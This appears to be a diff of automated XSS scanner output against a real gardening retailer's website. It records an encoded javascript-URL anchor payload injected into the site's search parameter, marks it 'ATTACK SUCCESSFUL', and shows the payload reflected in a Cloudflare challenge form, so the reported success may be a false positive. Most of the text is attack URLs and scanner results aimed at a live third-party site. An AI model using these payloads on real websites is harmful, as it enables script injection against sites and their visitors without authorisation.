@@ -1,4 +1,4 @@
-https://www.burpee.com/gardening-supplies/
+https://www.burpee.com/vegetables/tomatoes/
 
 GET Params:[1]
 ['q']
@@ -77,4 +77,4 @@ URL Attack Url: https://www.burpee.com/search?q=%3Ca+href%3D%22jaVaScripT%3AAleR
 
 => ATTACK SUCCESSFUL with Payload: %3Ca+href%3D%22jaVaScripT%3AAleRt%281%29%22%3Eclick_XYZ%3C%2Fa%3E
 Detection of Payload: 
-<form class="challenge-form" id="challenge-form" action="/search?q=%3Ca+href%3D%22jaVaScripT%3AAleRt%281%29%22%3Eclick_XYZ%3C%2Fa%3E&amp;__cf_chl_captcha_tk__=cdf9320b31714eee1c3f2cabc13cbfe43b30bfbb-1586151419-0-AcOTaFSqy9ek-zRJCJWFZ2NN4OUiGS8U-_yPb-xkY9QnzRDp7PCcMm1GsTF90NeA9Bw6LAzj-7yR-Hx6j0qhpOSWSjtxJeYD6T66q7qLmK6kKCAynL2Zi0r4XIwHisdneMHFIrzyoK5Z3MH5hl8p44jElOg3L40ARezN51sZFJJOThmFavWXU93Y_esCG6GaLWL1rkBqMFu_3uH7tBwriYdvKV_byKPHt4Rd6-rWOzOiXtvvpQVUTS3jMnMlCakPPd18V2-NG03D5TwlufUc9sDhMNKkeKTWPBMZHbYU8R9GFJtoR59w1ZLx0SRBEpBcxWZJ9UluMu9Q9Ix1j5R6gKl0J490BxaRPdmOFJtbEjEkjBJn2JKsAxKqzHrlsRNZeVjZ0VYYGQaf-dJUBaSNX61OZnCgbYdFBtySvy3rP-sGh-tpB2Ta9W-KCD5P2w9EBO0c7l06YFN8wnF4I35lhfWT0t1oKuuXTsGCeMJcNEnloSd4dn0NXkl-eLBJ9DRiotzacMhYAJapA17z445UyiOv07EQk5lbBbqtIXZiy8MQMaBY4GMqFHP2oCIX6X_3ki3GkddSn2-aBRn9A6VMIWQ" method="POST" enctype="application/x-www-form-urlencoded">
+<form class="challenge-form" id="challenge-form" action="/search?q=%3Ca+href%3D%22jaVaScripT%3AAleRt%281%29%22%3Eclick_XYZ%3C%2Fa%3E&amp;__cf_chl_captcha_tk__=ee18eaa3423540e061c83bb9f6a7f220b932cf0f-1586151464-0-AS-zCVoGM7mS8WvbnHtPRjgIDbiAKqW1FgurwFHxiYKlpGb69_2JVDDfevMAhd_0bMZKptKmpjeMNZ4nTtWorVSo6NDy9j2pM22AW9sWg3GaDloDJI76pKZo8Nlg9VaG_5gI3BUKNa9GZcSyrTOZrH4sFe5l__0Jd-ToRB8SzmXZQTJalJka1Ki8C6aKH1P7UTSfAE45ElnM0zPxqjAiAm6omlNWRVBkPS5sVfxE7k_kjTOVdPYQpjm8KJz3GbSW4rU2HzTXtm4nUW-Un749n37TN7t3bqo6TBgR2QUSsir1CBclnJsguo-kG05vIj0VQsA_ilWcS2G5zI8oUF9O2GP1u0RJtbUm2xEx8QMvViYlVEM13QzdeBmnvMMbDBpkb6B9480VthYCO9k9khybB-QxZ_36vYfKy387HNttRs3QXAllM07-Ffhjh9iUANBZewhy6RWKu56mMLgtLMD8klarLc138OBRBEuMBVPiQXQbVVbqxholGFbaQlhoHSnokdyQ3lU0xil0uFwrpjlbX5w5Sh2eF8ku4dfydqemWV2iU47-Vv1L3IZU73PmOg0_-hsBtUORlw6WF7FVO5XCypI" method="POST" enctype="application/x-www-form-urlencoded">
